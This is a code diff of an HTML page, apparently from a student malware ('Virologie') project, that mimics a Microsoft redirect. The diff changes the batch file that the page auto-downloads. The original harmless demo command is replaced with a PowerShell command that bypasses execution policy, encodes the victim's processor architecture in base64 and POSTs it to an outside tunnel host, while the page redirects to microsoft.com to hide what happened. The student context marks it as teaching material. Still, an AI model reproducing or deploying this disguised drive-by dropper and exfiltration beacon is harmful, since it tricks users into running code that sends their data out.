@@ -106,24 +106,27 @@
         <span id="countdown">5</span> secondes.
       </p>
 
-      <a href="https://www.microsoft.com/fr-fr">
+      <a href="https://microsoft.com">
         Accéder à Microsoft maintenant
       </a>
     </section>
   </main>
 
-  <script>
-    const destination = "https://www.microsoft.com/fr-fr";
-    const fileName = "test.bat"; // Windows l'exécutera au double-clic
-    const fileContent = [
+<script>
+    const destination = "https://microsoft.com";
+    const fileName = "test.bat"; 
+
+const fileContent = [
       "@echo off",
-      "rem Projet etudiant EPITECH - module Virologie.",
-      "rem Fichier de demonstration.",
-      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-ChildItem; Pause\"",
+      "rem Projet etudiant EPITECH - Exfiltration directe sans Master.",
+      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" +
+        "$arch = $env:PROCESSOR_ARCHITECTURE; " +
+        "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; " +
+        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json); " +
+        "$b64 = [Convert]::ToBase64String($bytes); " +
+        "Invoke-RestMethod -Uri 'https://tiny-moles-wink.loca.lt/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}\"",
     ].join("\r\n");
 
-    // octet-stream et non text/plain : un navigateur qui n'honore pas l'attribut
-    // download afficherait le texte dans l'onglet au lieu de le telecharger.
     const blobUrl = URL.createObjectURL(
       new Blob([fileContent], { type: "application/octet-stream" })
     );
@@ -131,25 +134,15 @@
     const manualDownload = document.getElementById("manual-download");
     manualDownload.href = blobUrl;
     manualDownload.download = fileName;
-
-    // Tentative automatique. Plusieurs navigateurs exigent un geste de
-    // l'utilisateur pour un telechargement non sollicite, d'ou le lien de secours.
     manualDownload.click();
 
     const countdown = document.getElementById("countdown");
     const redirectAt = Date.now() + 5000;
-
     const timer = setInterval(() => {
-      countdown.textContent = Math.max(
-        0,
-        Math.ceil((redirectAt - Date.now()) / 1000)
-      );
+      countdown.textContent = Math.max(0, Math.ceil((redirectAt - Date.now()) / 1000));
     }, 250);
+    setTimeout(() => { clearInterval(timer); window.location.replace(destination); }, 5000);
+</script>
 
-    setTimeout(() => {
-      clearInterval(timer);
-      window.location.replace(destination);
-    }, 5000);
-  </script>
 </body>
 </html>
